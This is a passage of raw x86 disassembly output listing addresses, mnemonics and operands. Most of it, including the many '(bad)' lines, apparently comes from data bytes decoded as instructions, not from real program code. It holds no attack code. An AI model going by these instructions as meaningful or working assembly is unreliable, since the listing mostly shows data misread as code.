  43bed0:	add    BYTE PTR [ebp-0x1],ah
  43bed3:	add    BYTE PTR [eax],al
  43bed5:	jb     0x43bed6
  43bed7:	add    BYTE PTR [eax],al
  43bed9:	push   0xffffffff
  43bedb:	add    BYTE PTR [eax],al
  43bedd:	outs   dx,DWORD PTR ds:[esi]
  43bede:	inc    DWORD PTR [eax]
  43bee0:	add    BYTE PTR [ebp-0x1],bl
  43bee3:	add    BYTE PTR [eax],al
  43bee5:	pop    eax
  43bee6:	inc    DWORD PTR [eax]
  43bee8:	add    BYTE PTR [eax-0x1],dl
  43beeb:	add    BYTE PTR [eax],al
  43beed:	push   ebx
  43beee:	inc    DWORD PTR [eax]
  43bef0:	add    BYTE PTR [esi],dh
  43bef2:	inc    DWORD PTR [eax]
  43bef4:	add    BYTE PTR [edi],ch
  43bef6:	inc    DWORD PTR [eax]
  43bef8:	add    BYTE PTR [edx],dh
  43befa:	inc    DWORD PTR [eax]
  43befc:	add    BYTE PTR [edi],ah
  43befe:	inc    DWORD PTR [eax]
  43bf00:	add    BYTE PTR [esi],ah
  43bf02:	inc    DWORD PTR [eax]
  43bf04:	add    BYTE PTR [eax],ch
  43bf06:	inc    DWORD PTR [eax]
  43bf08:	add    BYTE PTR ds:0x200000ff,ah
  43bf0e:	inc    DWORD PTR [eax]
  43bf10:	add    BYTE PTR [ebx],ch
  43bf12:	inc    DWORD PTR [eax]
  43bf14:	add    BYTE PTR [edi+edi*8],ch
  43bf17:	add    BYTE PTR [eax],al
  43bf19:	and    al,0xff
  43bf1b:	add    BYTE PTR [eax],al
  43bf1d:	and    edi,edi
  43bf1f:	add    BYTE PTR [eax],al
  43bf21:	cmp    bh,bh
  43bf23:	add    BYTE PTR [eax],al
  43bf25:	sub    bh,bh
  43bf27:	add    BYTE PTR [eax],al
  43bf29:	inc    DWORD PTR es:[eax]
  43bf2c:	add    BYTE PTR [ecx],ah
  43bf2e:	inc    DWORD PTR [eax]
  43bf30:	add    BYTE PTR [edi],bl
  43bf32:	inc    DWORD PTR [eax]
  43bf34:	add    BYTE PTR [esi],bl
  43bf36:	inc    DWORD PTR [eax]
  43bf38:	add    BYTE PTR [edi],bl
  43bf3a:	inc    DWORD PTR [eax]
  43bf3c:	add    BYTE PTR [eax],ah
  43bf3e:	inc    DWORD PTR [eax]
  43bf40:	add    BYTE PTR [edx],bl
  43bf42:	inc    DWORD PTR [eax]
  43bf44:	add    BYTE PTR [ebx],bl
  43bf46:	inc    DWORD PTR [eax]
  43bf48:	add    BYTE PTR [edi+edi*8],bl
  43bf4b:	add    BYTE PTR [eax],al
  43bf4d:	sbb    eax,0x270000ff
  43bf52:	inc    DWORD PTR [eax]
  43bf54:	add    BYTE PTR [esi],ah
  43bf56:	inc    DWORD PTR [eax]
  43bf58:	add    BYTE PTR [edi+edi*8],ch
  43bf5b:	add    BYTE PTR [eax],al
  43bf5d:	and    al,0xff
  43bf5f:	add    BYTE PTR [eax],al
  43bf61:	sub    bh,bh
  43bf63:	add    BYTE PTR [eax],al
  43bf65:	and    eax,0x2a0000ff
  43bf6a:	inc    DWORD PTR [eax]
  43bf6c:	add    BYTE PTR [edi+edi*8],ah
  43bf6f:	add    BYTE PTR [eax],al
  43bf71:	sbb    eax,0x210000ff
  43bf76:	inc    DWORD PTR [eax]
  43bf78:	add    BYTE PTR [edi+edi*8],bl
  43bf7b:	add    BYTE PTR [eax],al
  43bf7d:	push   ds
  43bf7e:	inc    DWORD PTR [eax]
  43bf80:	add    BYTE PTR [ebx],ch
  43bf82:	inc    DWORD PTR [eax]
  43bf84:	add    BYTE PTR [eax],bl
  43bf86:	inc    DWORD PTR [eax]
  43bf88:	add    BYTE PTR [esi],ah
  43bf8a:	inc    DWORD PTR [eax]
  43bf8c:	add    BYTE PTR [eax],ah
  43bf8e:	inc    DWORD PTR [eax]
  43bf90:	add    BYTE PTR [edx],ah
  43bf92:	inc    DWORD PTR [eax]
  43bf94:	add    BYTE PTR [ecx-0x1],al
  43bf97:	add    BYTE PTR [eax],al
  43bf99:	inc    esp
  43bf9a:	inc    DWORD PTR [eax]
  43bf9c:	add    BYTE PTR [edx-0x1],cl
  43bf9f:	add    BYTE PTR [eax],al
  43bfa1:	popa   
  43bfa2:	inc    DWORD PTR [eax]
  43bfa4:	add    BYTE PTR [ebp-0x1],dh
  43bfa7:	add    BYTE PTR [eax],al
  43bfa9:	jge    0x43bfaa
  43bfab:	add    al,BYTE PTR [esp+ebp*4]
  43bfae:	inc    DWORD PTR [eax]
  43bfb0:	add    BYTE PTR [esi-0x7dffff01],cl
  43bfb6:	inc    DWORD PTR [eax]
  43bfb8:	add    BYTE PTR [ebp-0x1],dh
  43bfbb:	add    BYTE PTR [eax],al
  43bfbd:	dec    edi
  43bfbe:	inc    DWORD PTR [eax]
  43bfc0:	add    BYTE PTR [edi+edi*8+0x0],al
  43bfc4:	add    BYTE PTR [edi+edi*8+0x0],cl
  43bfc8:	add    BYTE PTR [ebx],dh
  43bfca:	inc    DWORD PTR [eax]
  43bfcc:	add    BYTE PTR [ecx],bh
  43bfce:	inc    DWORD PTR [eax]
  43bfd0:	add    BYTE PTR [eax],bh
  43bfd2:	inc    DWORD PTR [eax]
  43bfd4:	add    BYTE PTR [edx],dh
  43bfd6:	inc    DWORD PTR [eax]
  43bfd8:	add    BYTE PTR [edi+edi*8],ch
  43bfdb:	add    BYTE PTR [eax],al
  43bfdd:	inc    ecx
  43bfde:	inc    DWORD PTR [eax]
  43bfe0:	add    BYTE PTR [edi],bh
  43bfe2:	inc    DWORD PTR [eax]
  43bfe4:	add    BYTE PTR [ebx-0x1],al
  43bfe7:	add    BYTE PTR [eax],al
  43bfe9:	inc    edi
  43bfea:	inc    DWORD PTR [eax]
  43bfec:	add    BYTE PTR [ecx-0x1],al
  43bfef:	add    BYTE PTR [eax],al
  43bff1:	inc    esp
  43bff2:	inc    DWORD PTR [eax]
  43bff4:	add    BYTE PTR [edx-0x1],al
  43bff7:	add    BYTE PTR [eax],al
  43bff9:	pop    esp
  43bffa:	inc    DWORD PTR [eax]
  43bffc:	add    BYTE PTR [ebp-0x1],cl
  43bfff:	add    BYTE PTR [eax],al
  43c001:	push   esp
  43c002:	inc    DWORD PTR [eax]
  43c004:	add    BYTE PTR [ebp-0x1],bl
  43c007:	add    BYTE PTR [eax],al
  43c009:	arpl   di,di
  43c00b:	add    BYTE PTR [eax],al
  43c00d:	pop    ebx
  43c00e:	inc    DWORD PTR [eax]
  43c010:	add    BYTE PTR [esi-0x1],dl
  43c013:	add    BYTE PTR [eax],al
  43c015:	popa   
  43c016:	inc    DWORD PTR [eax]
  43c018:	add    BYTE PTR [ebx-0x1],bl
  43c01b:	add    BYTE PTR [eax],al
  43c01d:	push   ecx
  43c01e:	inc    DWORD PTR [eax]
  43c020:	add    BYTE PTR [ecx-0x1],ch
  43c023:	add    BYTE PTR [eax],al
  43c025:	jo     0x43c026
  43c027:	add    BYTE PTR [eax],al
  43c029:	push   0xffffffff
  43c02b:	add    BYTE PTR [eax],al
  43c02d:	pop    esi
  43c02e:	inc    DWORD PTR [eax]
  43c030:	add    BYTE PTR [edi+edi*8+0x0],dl
  43c034:	add    BYTE PTR [esi],bh
  43c036:	inc    DWORD PTR [eax]
  43c038:	add    BYTE PTR [edi],bh
  43c03a:	inc    DWORD PTR [eax]
  43c03c:	add    BYTE PTR [edx],bh
  43c03e:	inc    DWORD PTR [eax]
  43c040:	add    BYTE PTR [ebx],dh
  43c042:	inc    DWORD PTR [eax]
  43c044:	add    BYTE PTR [ecx],bh
  43c046:	inc    DWORD PTR [eax]
  43c048:	add    BYTE PTR [esi-0x1],al
  43c04b:	add    BYTE PTR [eax],al
  43c04d:	dec    esi
  43c04e:	inc    DWORD PTR [eax]
  43c050:	add    BYTE PTR [ebx-0x1],dl
  43c053:	add    BYTE PTR [eax],al
  43c055:	push   esp
  43c056:	inc    DWORD PTR [eax]
  43c058:	add    BYTE PTR [ecx-0x1],ch
  43c05b:	add    BYTE PTR [eax],al
  43c05d:	outs   dx,BYTE PTR ds:[esi]
  43c05e:	inc    DWORD PTR [eax]
  43c060:	add    BYTE PTR [eax-0x6effff01],cl
  43c066:	inc    DWORD PTR [eax]
  43c068:	add    BYTE PTR [ebx-0x63ffff01],dl
  43c06e:	inc    DWORD PTR [eax]
  43c070:	add    BYTE PTR [edi-0x5dffff01],bl
  43c076:	inc    DWORD PTR [eax]
  43c078:	add    BYTE PTR [edx-0x66ffff01],dl
  43c07e:	inc    DWORD PTR [eax]
  43c080:	add    BYTE PTR [ebp-0x60ffff01],dl
  43c086:	inc    DWORD PTR [eax]
  43c088:	add    BYTE PTR [esi-0x63ffff01],bl
  43c08e:	inc    DWORD PTR [eax]
  43c090:	add    BYTE PTR [edi+edi*8-0x650000],dl
  43c097:	add    BYTE PTR [eax],al
  43c099:	xchg   ecx,eax
  43c09a:	inc    DWORD PTR [eax]
  43c09c:	add    BYTE PTR [eax-0x7fffff01],cl
  43c0a2:	inc    DWORD PTR [eax]
  43c0a4:	add    BYTE PTR [edx+0x760000ff],al
  43c0aa:	inc    DWORD PTR [eax]
  43c0ac:	add    BYTE PTR [ecx-0x1],bh
  43c0af:	add    BYTE PTR [eax],al
  43c0b1:	je     0x43c0b2
  43c0b3:	add    BYTE PTR [eax],al
  43c0b5:	jb     0x43c0b6
  43c0b7:	add    BYTE PTR [eax],al
  43c0b9:	cmp    edi,0x0
  43c0bc:	add    BYTE PTR [edx-0x65ffff01],cl
  43c0c2:	inc    DWORD PTR [eax]
  43c0c4:	add    BYTE PTR [eax-0x67ffff01],bl
  43c0ca:	inc    DWORD PTR [eax]
  43c0cc:	add    BYTE PTR [ecx-0x66ffff01],bl
  43c0d2:	inc    DWORD PTR [eax]
  43c0d4:	add    BYTE PTR [edx-0x6effff01],bl
  43c0da:	inc    DWORD PTR [eax]
  43c0dc:	add    BYTE PTR [ecx-0x79ffff01],dl
  43c0e2:	inc    DWORD PTR [eax]
  43c0e4:	add    BYTE PTR [esi-0x1],dh
  43c0e7:	add    BYTE PTR [eax],al
  43c0e9:	outs   dx,DWORD PTR ds:[esi]
  43c0ea:	inc    DWORD PTR [eax]
  43c0ec:	add    BYTE PTR [esi-0x1],bl
  43c0ef:	add    BYTE PTR [eax],al
  43c0f1:	dec    esi
  43c0f2:	inc    DWORD PTR [eax]
  43c0f4:	add    BYTE PTR [ebp-0x1],al
  43c0f7:	add    BYTE PTR [eax],al
  43c0f9:	cmp    bh,bh
  43c0fb:	add    BYTE PTR [eax],al
  43c0fd:	cmp    bh,bh
  43c0ff:	add    BYTE PTR [eax],al
  43c101:	inc    DWORD PTR cs:[eax]
  43c104:	add    BYTE PTR [esi],ch
  43c106:	inc    DWORD PTR [eax]
  43c108:	add    BYTE PTR [edi+edi*8],ch
  43c10b:	add    BYTE PTR [eax],al
  43c10d:	das    
  43c10e:	inc    DWORD PTR [eax]
  43c110:	add    BYTE PTR [esi],ch
  43c112:	inc    DWORD PTR [eax]
  43c114:	add    BYTE PTR [ecx],ch
  43c116:	inc    DWORD PTR [eax]
  43c118:	add    BYTE PTR [edi],ch
  43c11a:	inc    DWORD PTR [eax]
  43c11c:	add    BYTE PTR [eax],ch
  43c11e:	inc    DWORD PTR [eax]
  43c120:	add    BYTE PTR [edi],ch
  43c122:	inc    DWORD PTR [eax]
  43c124:	add    BYTE PTR [ebx],ah
  43c126:	inc    DWORD PTR [eax]
  43c128:	add    BYTE PTR [esi],bl
  43c12a:	inc    DWORD PTR [eax]
  43c12c:	add    BYTE PTR [eax],bl
  43c12e:	inc    DWORD PTR [eax]
  43c130:	add    BYTE PTR [ebx],ah
  43c132:	inc    DWORD PTR [eax]
  43c134:	add    BYTE PTR [edx],ah
  43c136:	inc    DWORD PTR [eax]
  43c138:	add    BYTE PTR [ebx],ah
  43c13a:	inc    DWORD PTR [eax]
  43c13c:	add    BYTE PTR [edi],ah
  43c13e:	inc    DWORD PTR [eax]
  43c140:	add    BYTE PTR [edi],bl
  43c142:	inc    DWORD PTR [eax]
  43c144:	add    BYTE PTR [edx],bl
  43c146:	inc    DWORD PTR [eax]
  43c148:	add    BYTE PTR ds:0x1c0000ff,bl
  43c14e:	inc    DWORD PTR [eax]
  43c150:	add    BYTE PTR [edi+edi*8],ah
  43c153:	add    BYTE PTR [eax],al
  43c155:	sub    edi,edi
  43c157:	add    BYTE PTR [eax],al
  43c159:	xor    bh,bh
  43c15b:	add    BYTE PTR [eax],al
  43c15d:	and    al,0xff
  43c15f:	add    BYTE PTR [eax],al
  43c161:	and    eax,0x290000ff
  43c166:	inc    DWORD PTR [eax]
  43c168:	add    BYTE PTR [edi+edi*8],ah
  43c16b:	add    BYTE PTR [eax],al
  43c16d:	pop    ds
  43c16e:	inc    DWORD PTR [eax]
  43c170:	add    BYTE PTR [ecx],bl
  43c172:	inc    DWORD PTR [eax]
  43c174:	add    BYTE PTR [edi],bl
  43c176:	inc    DWORD PTR [eax]
  43c178:	add    BYTE PTR [esi],bl
  43c17a:	inc    DWORD PTR [eax]
  43c17c:	add    BYTE PTR [ecx],ah
  43c17e:	inc    DWORD PTR [eax]
  43c180:	add    BYTE PTR [edx],ch
  43c182:	inc    DWORD PTR [eax]
  43c184:	add    BYTE PTR [edi],ch
  43c186:	inc    DWORD PTR [eax]
  43c188:	add    BYTE PTR [esi],dh
  43c18a:	inc    DWORD PTR [eax]
  43c18c:	add    BYTE PTR [esi],bl
  43c18e:	inc    DWORD PTR [eax]
  43c190:	add    BYTE PTR ds:0x2f0000ff,bl
  43c196:	inc    DWORD PTR [eax]
  43c198:	add    BYTE PTR [ebx-0x1],al
  43c19b:	add    BYTE PTR [eax],al
  43c19d:	pop    ebp
  43c19e:	inc    DWORD PTR [eax]
  43c1a0:	add    BYTE PTR [ebp-0x69ffff01],cl
  43c1a6:	call   DWORD PTR [esi-0x4700193a]
  43c1ac:	clc    
  43c1ad:	lock jmp DWORD PTR [esi-0x7e]
  43c1b1:	fdivr  st,st(7)
  43c1b3:	add    eax,0xffb007
  43c1b8:	add    BYTE PTR [edx+0x790000ff],bl
  43c1be:	inc    DWORD PTR [eax]
  43c1c0:	add    BYTE PTR [edi+edi*8+0x0],ah
  43c1c4:	add    BYTE PTR [edi+edi*8+0x0],bl
  43c1c8:	add    BYTE PTR [eax-0x1],dl
  43c1cb:	add    BYTE PTR [eax],al
  43c1cd:	dec    esi
  43c1ce:	inc    DWORD PTR [eax]
  43c1d0:	add    BYTE PTR [edx-0x1],al
  43c1d3:	add    BYTE PTR [eax],al
  43c1d5:	inc    edx
  43c1d6:	inc    DWORD PTR [eax]
  43c1d8:	add    BYTE PTR ds:0x530000ff,dh
  43c1de:	inc    DWORD PTR [eax]
  43c1e0:	add    BYTE PTR [esi-0x1],al
  43c1e3:	add    BYTE PTR [eax],al
  43c1e5:	push   esp
  43c1e6:	inc    DWORD PTR [eax]
  43c1e8:	add    BYTE PTR [edx-0x1],ah
  43c1eb:	add    BYTE PTR [eax],al
  43c1ed:	popa   
  43c1ee:	inc    DWORD PTR [eax]
  43c1f0:	add    BYTE PTR [edi+edi*8+0x0],bl
  43c1f4:	add    BYTE PTR [esi-0x1],bl
  43c1f7:	add    BYTE PTR [eax],al
  43c1f9:	(bad)  
  43c1fa:	inc    DWORD PTR [eax]
  43c1fc:	add    BYTE PTR [ebp-0x1],bl
  43c1ff:	add    BYTE PTR [eax],al
  43c201:	ins    DWORD PTR es:[edi],dx
  43c202:	inc    DWORD PTR [eax]
  43c204:	add    BYTE PTR [ebp-0x1],ch
  43c207:	add    BYTE PTR [eax],al
  43c209:	ins    BYTE PTR es:[edi],dx
  43c20a:	inc    DWORD PTR [eax]
  43c20c:	add    BYTE PTR [ecx-0x1],bh
  43c20f:	add    BYTE PTR [eax],al
  43c211:	ins    BYTE PTR es:[edi],dx
  43c212:	inc    DWORD PTR [eax]
  43c214:	add    BYTE PTR [ebp-0x1],ch
  43c217:	add    BYTE PTR [eax],al
  43c219:	cmp    edi,0x0
  43c21c:	add    BYTE PTR [edx-0x1],bh
  43c21f:	add    BYTE PTR [eax],al
  43c221:	jp     0x43c222
  43c223:	add    BYTE PTR [eax],al
  43c225:	cmp    edi,0x0
  43c228:	add    BYTE PTR [edi+edi*8-0x910000],al
  43c22f:	add    BYTE PTR [eax],al
  43c231:	inc    DWORD PTR fs:[eax]
  43c234:	add    BYTE PTR [edi-0x1],al
  43c237:	add    BYTE PTR [eax],al
  43c239:	inc    edi
  43c23a:	inc    DWORD PTR [eax]
  43c23c:	add    BYTE PTR [eax],dh
  43c23e:	inc    DWORD PTR [eax]
  43c240:	add    BYTE PTR ds:0x360000ff,bh
  43c246:	inc    DWORD PTR [eax]
  43c248:	add    BYTE PTR [esi],ch
  43c24a:	inc    DWORD PTR [eax]
  43c24c:	add    BYTE PTR ds:0x520000ff,bh
  43c252:	inc    DWORD PTR [eax]
  43c254:	add    BYTE PTR [ecx-0x1],bl
  43c257:	add    BYTE PTR [eax],al
  43c259:	ja     0x43c25a
  43c25b:	or     ecx,DWORD PTR [edi]
  43c25d:	sahf   
  43c25e:	jmp    DWORD PTR ds:0x32ffcd31
  43c264:	aas    
  43c265:	xlat   BYTE PTR ds:[ebx]
  43c266:	jmp    FWORD PTR [edi]
  43c268:	cmp    bl,dh
  43c26a:	jmp    FWORD PTR [ebp-0x80]
  43c26d:	jecxz  0x43c26e
  43c26f:	ja     0x43c208
  43c271:	in     al,dx
  43c272:	jmp    FWORD PTR [ecx-0x75]
  43c275:	out    0xff,al
  43c277:	and    sp,0xffff
  43c27b:	jae    0x43c203
  43c27d:	out    0xff,eax
  43c27f:	ins    BYTE PTR es:[edi],dx
  43c280:	test   bh,ah
  43c282:	jmp    DWORD PTR [ecx+0x7c]
  43c285:	loop   0x43c286
  43c287:	pop    ebx
  43c288:	jbe    0x43c263
  43c28a:	(bad)  
  43c28b:	js     0x43c215
  43c28d:	call   0xe5cc4391
  43c292:	jmp    FWORD PTR [edi]
  43c294:	test   dh,ah
  43c296:	inc    DWORD PTR [eax]
  43c298:	jae    0x43c27b
  43c29a:	dec    DWORD PTR [eax+0x79]
  43c29d:	aam    0xff
  43c29f:	add    BYTE PTR [eax],al
  43c2a1:	(bad)  
  43c2a4:	add    DWORD PTR [ebp-0x72ffff01],esp
  43c2aa:	inc    DWORD PTR [eax]
  43c2ac:	add    BYTE PTR [edi-0x57f9fd01],cl
  43c2b2:	call   FWORD PTR [ebx]
  43c2b4:	dec    ecx
  43c2b5:	enter  0x11ff,0x54
  43c2b9:	sar    edi,1
  43c2bb:	dec    ebx
  43c2bc:	jl     0x43c29b
  43c2be:	(bad)  
  43c2bf:	cmp    eax,0x3fffe677
  43c2c4:	outs   dx,DWORD PTR ds:[esi]
  43c2c5:	out    0xff,eax
  43c2c7:	inc    esp
  43c2c8:	ja     0x43c2b4
  43c2ca:	(bad)  
  43c2cb:	aas    
  43c2cc:	outs   dx,DWORD PTR ds:[esi]
  43c2cd:	out    0xff,eax
  43c2cf:	cmp    BYTE PTR [ebx-0x1a],ch
  43c2d2:	inc    DWORD PTR [eax]
  43c2d4:	cmp    al,ah
  43c2d6:	inc    DWORD PTR [ecx]
  43c2d8:	dec    eax
  43c2d9:	loopne 0x43c2da
  43c2db:	push   ds
  43c2dc:	pop    edi
  43c2dd:	(bad)  
  43c2df:	push   edx
  43c2e0:	arpl   si,cx
  43c2e2:	dec    DWORD PTR [ebx]
  43c2e4:	pop    ds
  43c2e5:	mov    bl,0xff
  43c2e7:	add    BYTE PTR [eax],al
  43c2e9:	xchg   ebx,eax
  43c2ea:	inc    DWORD PTR [eax]
  43c2ec:	add    BYTE PTR [esi-0x1],bh
  43c2ef:	add    BYTE PTR [eax],al
  43c2f1:	pusha  
  43c2f2:	inc    DWORD PTR [eax]
  43c2f4:	add    BYTE PTR [edx-0x1],cl
  43c2f7:	add    BYTE PTR [eax],al
  43c2f9:	inc    edx
  43c2fa:	inc    DWORD PTR [eax]
  43c2fc:	add    BYTE PTR [ebx],ch
  43c2fe:	inc    DWORD PTR [eax]
  43c300:	add    BYTE PTR [ebx],ch
  43c302:	inc    DWORD PTR [eax]
  43c304:	add    BYTE PTR [ecx],ah
  43c306:	inc    DWORD PTR [eax]
  43c308:	add    BYTE PTR [ecx],dh
  43c30a:	inc    DWORD PTR [eax]
  43c30c:	add    BYTE PTR [ebx],ch
  43c30e:	inc    DWORD PTR [eax]
  43c310:	add    BYTE PTR [edx],ch
  43c312:	inc    DWORD PTR [eax]
  43c314:	add    BYTE PTR [eax],ch
  43c316:	inc    DWORD PTR [eax]
  43c318:	add    BYTE PTR [esi],ch
  43c31a:	inc    DWORD PTR [eax]
  43c31c:	add    BYTE PTR ds:0x2f0000ff,ah
  43c322:	inc    DWORD PTR [eax]
  43c324:	add    BYTE PTR [ebx],ch
  43c326:	inc    DWORD PTR [eax]
  43c328:	add    BYTE PTR [edi+edi*8],ah
  43c32b:	add    BYTE PTR [eax],al
  43c32d:	inc    DWORD PTR es:[eax]
  43c330:	add    BYTE PTR [ecx],ah
  43c332:	inc    DWORD PTR [eax]
  43c334:	add    BYTE PTR [ecx],ah
  43c336:	inc    DWORD PTR [eax]
  43c338:	add    BYTE PTR [edi+edi*8],ah
  43c33b:	add    BYTE PTR [eax],al
  43c33d:	sub    bh,bh
  43c33f:	add    BYTE PTR [eax],al
  43c341:	and    al,0xff
  43c343:	add    BYTE PTR [eax],al
  43c345:	sbb    bh,bh
  43c347:	add    BYTE PTR [eax],al
  43c349:	sbb    bh,bh
  43c34b:	add    BYTE PTR [eax],al
  43c34d:	sbb    eax,0x180000ff
  43c352:	inc    DWORD PTR [eax]
  43c354:	add    BYTE PTR [ecx],ah
  43c356:	inc    DWORD PTR [eax]
  43c358:	add    BYTE PTR [edx],ch
  43c35a:	inc    DWORD PTR [eax]
  43c35c:	add    BYTE PTR ds:0x220000ff,bl
  43c362:	inc    DWORD PTR [eax]
  43c364:	add    BYTE PTR [eax],ch
  43c366:	inc    DWORD PTR [eax]
  43c368:	add    BYTE PTR [edi],ch
  43c36a:	inc    DWORD PTR [eax]
  43c36c:	add    BYTE PTR [edi+edi*8],ah
  43c36f:	add    BYTE PTR [eax],al
  43c371:	sbb    eax,0x220000ff
  43c376:	inc    DWORD PTR [eax]
  43c378:	add    BYTE PTR [ecx],ch
  43c37a:	inc    DWORD PTR [eax]
  43c37c:	add    BYTE PTR ds:0x1e0000ff,bl
  43c382:	inc    DWORD PTR [eax]
  43c384:	add    BYTE PTR [edx],ch
  43c386:	inc    DWORD PTR [eax]
  43c388:	add    BYTE PTR ds:0x290000ff,ah
  43c38e:	inc    DWORD PTR [eax]
  43c390:	add    BYTE PTR [edi],ch
  43c392:	inc    DWORD PTR [eax]
  43c394:	add    BYTE PTR [edx-0x1],al
  43c397:	add    BYTE PTR [eax],al
  43c399:	push   esi
  43c39a:	inc    DWORD PTR [eax]
  43c39c:	add    BYTE PTR [edi-0x1],ch
  43c39f:	add    BYTE PTR [eax],al
  43c3a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43c3a2:	jmp    DWORD PTR [esi-0x75]
  43c3a5:	bnd jmp ecx
  43c3a8:	(bad)  
  43c3a9:	cli    
  43c3aa:	inc    edx
  43c3ac:	(bad)  
  43c3ad:	lock dec edi
  43c3b0:	push   eax
  43c3b2:	call   DWORD PTR [esi+0x2fffe5a7]
  43c3b8:	inc    ecx
  43c3b9:	aam    0xff
  43c3bb:	add    BYTE PTR [eax],al
  43c3bd:	stos   BYTE PTR es:[edi],al
  43c3be:	inc    DWORD PTR [eax]
  43c3c0:	add    BYTE PTR [edi+edi*8-0x7d0000],dl
  43c3c7:	add    BYTE PTR [eax],al
  43c3c9:	jo     0x43c3ca
  43c3cb:	add    BYTE PTR [eax],al
  43c3cd:	popa   
  43c3ce:	inc    DWORD PTR [eax]
  43c3d0:	add    BYTE PTR [esi-0x1],cl
  43c3d3:	add    BYTE PTR [eax],al
  43c3d5:	pop    esp
  43c3d6:	inc    DWORD PTR [eax]
  43c3d8:	add    BYTE PTR [edx-0x1],ah
  43c3db:	add    BYTE PTR [eax],al
  43c3dd:	imul   edi,edi,0xff6a0000
  43c3e3:	add    BYTE PTR [eax],al
  43c3e5:	jbe    0x43c3e6
  43c3e7:	add    BYTE PTR [eax],al
  43c3e9:	cmp    edi,0x0
  43c3ec:	add    BYTE PTR [edi+edi*8+0x0],bh
  43c3f0:	add    BYTE PTR [ebp-0x71ffff01],al
  43c3f6:	inc    DWORD PTR [eax]
  43c3f8:	add    BYTE PTR [ecx-0x6affff01],dl
  43c3fe:	inc    DWORD PTR [eax]
  43c400:	add    BYTE PTR [eax-0x68ffff01],dl
  43c406:	inc    DWORD PTR [eax]
  43c408:	add    BYTE PTR [edx-0x60ffff01],dl
  43c40e:	inc    DWORD PTR [eax]
  43c410:	add    BYTE PTR [esi-0x62ffff01],bl
  43c416:	inc    DWORD PTR [eax]
  43c418:	add    BYTE PTR [edi+edi*8-0x56f8fc],ch
  43c41f:	or     ecx,DWORD PTR [edi]
  43c421:	lods   al,BYTE PTR ds:[esi]
  43c422:	inc    DWORD PTR [eax]
  43c424:	bswap  ebx
  43c426:	call   FWORD PTR [ecx]
  43c428:	sbb    eax,0x513effc3
  43c42d:	xlat   BYTE PTR ds:[ebx]
  43c42e:	dec    DWORD PTR ds:0xffa917
  43c434:	add    BYTE PTR [edi-0x1],ah
  43c437:	add    BYTE PTR [eax],al
  43c439:	dec    ecx
  43c43a:	inc    DWORD PTR [eax]
  43c43c:	add    BYTE PTR ds:0x3c0000ff,dh
  43c442:	inc    DWORD PTR [eax]
  43c444:	add    BYTE PTR [esi],dh
  43c446:	inc    DWORD PTR [eax]
  43c448:	add    BYTE PTR [edx],bh
  43c44a:	inc    DWORD PTR [eax]
  43c44c:	add    BYTE PTR [eax-0x1],cl
  43c44f:	add    BYTE PTR [eax],al
  43c451:	pop    ecx
  43c452:	inc    DWORD PTR [ecx]
  43c454:	add    DWORD PTR [ebx-0x1],esp
  43c457:	inc    esi
  43c458:	pop    ecx
  43c459:	sar    edi,cl
  43c45b:	mov    ecx,0xd4fff3e1
  43c460:	cld    
  43c461:	cmc    
  43c462:	(bad)  
  43c463:	fdiv   st(7),st
  43c465:	idiv   edi
  43c467:	xlat   BYTE PTR ds:[ebx]
  43c468:	(bad)  
  43c469:	stc    
  43c46a:	inc    eax
  43c46c:	cld    
  43c46d:	repz dec ecx
  43c470:	clc    
  43c471:	hlt    
  43c472:	dec    edx
  43c474:	(bad)  
  43c475:	cld    
  43c476:	(bad)  
  43c477:	fdivr  st,st(7)
  43c479:	std    
  43c47a:	jmp    FWORD PTR [eax-0x5d001725]
  43c480:	jmp    0x43c46f
  43c482:	(bad)  
  43c483:	mov    eax,0xdafff4f3
  43c488:	(bad)  
  43c489:	(bad)  
  43c48a:	push   DWORD PTR [edi+ebp*8-0x132000d]
  43c491:	idiv   edi
  43c493:	fdivr  st,st(7)
  43c495:	(bad)  
  43c496:	(bad)  
  43c497:	fcos   
  43c499:	(bad)  
  43c49a:	(bad)  
  43c49b:	(bad)  
  43c49d:	std    
  43c49e:	jmp    FWORD PTR [ebx+0x12fff4e0]
  43c4a4:	dec    ebx
  43c4a5:	jmp    0xff:0xc00802ff
  43c4ac:	add    BYTE PTR [eax-0x44f0f301],bh
  43c4b2:	dec    esp
  43c4b4:	push   edi
  43c4b6:	jmp    DWORD PTR [esi-0x24000601]
  43c4bc:	(bad)  
  43c4bd:	sti    
  43c4be:	call   ebp
  43c4c0:	(bad)  
  43c4c1:	(bad)  
  43c4c2:	dec    eax
  43c4c4:	push   edi
  43c4c6:	inc    eax
  43c4c8:	cli    
  43c4c9:	repz call ebp
  43c4cc:	(bad)  
  43c4cd:	cli    
  43c4ce:	dec    edx
  43c4d0:	(bad)  
  43c4d1:	cli    
  43c4d2:	dec    edi
  43c4d4:	(bad)  
  43c4d5:	stc    
  43c4d6:	call   esi
  43c4d8:	(bad)  
  43c4d9:	stc    
  43c4da:	(bad)  
  43c4db:	fdivp  st(7),st
  43c4dd:	cld    
  43c4de:	call   eax
  43c4e0:	(bad)  
  43c4e1:	stc    
  43c4e2:	dec    edi
  43c4e4:	stc    
  43c4e5:	sti    
  43c4e6:	call   DWORD PTR [esi+0x60]
  43c4e9:	out    0xff,eax
  43c4eb:	add    BYTE PTR [eax],al
  43c4ed:	mov    ch,0xff
  43c4ef:	add    BYTE PTR [eax],al
  43c4f1:	mov    edi,edi
  43c4f3:	add    BYTE PTR [eax],al
  43c4f5:	inc    DWORD PTR gs:[eax]
  43c4f8:	add    BYTE PTR [edi+edi*8+0x0],dl
  43c4fc:	add    BYTE PTR [edi],dh
  43c4fe:	inc    DWORD PTR [eax]
  43c500:	add    BYTE PTR [edi],ah
  43c502:	inc    DWORD PTR [eax]
  43c504:	add    BYTE PTR ds:0x300000ff,ah
  43c50a:	inc    DWORD PTR [eax]
  43c50c:	add    BYTE PTR [edi+edi*8],ch
  43c50f:	add    BYTE PTR [eax],al
  43c511:	and    edi,edi
  43c513:	add    BYTE PTR [eax],al
  43c515:	daa    
  43c516:	inc    DWORD PTR [eax]
  43c518:	add    BYTE PTR ds:0x270000ff,ch
  43c51e:	inc    DWORD PTR [eax]
  43c520:	add    BYTE PTR [ecx],ch
  43c522:	inc    DWORD PTR [eax]
  43c524:	add    BYTE PTR [edi+edi*8],ch
  43c527:	add    BYTE PTR [eax],al
  43c529:	and    edi,edi
  43c52b:	add    BYTE PTR [eax],al
  43c52d:	inc    DWORD PTR es:[eax]
  43c530:	add    BYTE PTR ds:0x260000ff,ah
  43c536:	inc    DWORD PTR [eax]
  43c538:	add    BYTE PTR [eax],ah
